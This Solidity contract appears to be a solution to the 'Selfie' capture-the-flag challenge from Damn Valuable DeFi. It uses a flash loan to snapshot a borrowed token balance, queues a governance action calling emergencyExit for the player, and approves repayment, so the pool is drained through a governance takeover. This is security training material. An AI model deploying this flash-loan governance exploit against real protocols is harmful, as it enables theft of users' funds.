// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieAttacker is IERC3156FlashBorrower {
    SelfiePool private immutable _selfiePool;
    DamnValuableTokenSnapshot private immutable _token;
    ISimpleGovernance private immutable _simpleGovernance;
    address private immutable _player;
    uint256 public actionId;

    error FlashLoanError();

    constructor(
        SelfiePool selfiePool,
        DamnValuableTokenSnapshot token,
        ISimpleGovernance simpleGovernance,
        address player
    ) {
        _selfiePool = selfiePool;
        _token = DamnValuableTokenSnapshot(token);
        _simpleGovernance = simpleGovernance;
        _player = player;
    }

    function attack(uint256 amount) external {
        // execute flashloan
        bool ok = _selfiePool.flashLoan(
            IERC3156FlashBorrower(this),
            address(_token),
            amount,
            ""
        );

        if (!ok) {
            revert FlashLoanError();
        }
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // doing a snapshot so we get a big balance
        DamnValuableTokenSnapshot(token).snapshot();
        // queuing the emergencyExit action with the player address
        // As we will get a big amount of the pool, we will be able to trigger the executeAction
        actionId = _simpleGovernance.queueAction(
            address(_selfiePool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", _player)
        );
        // approving repay
        require(DamnValuableTokenSnapshot(token).approve(address(_selfiePool), amount), "approve failed");
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
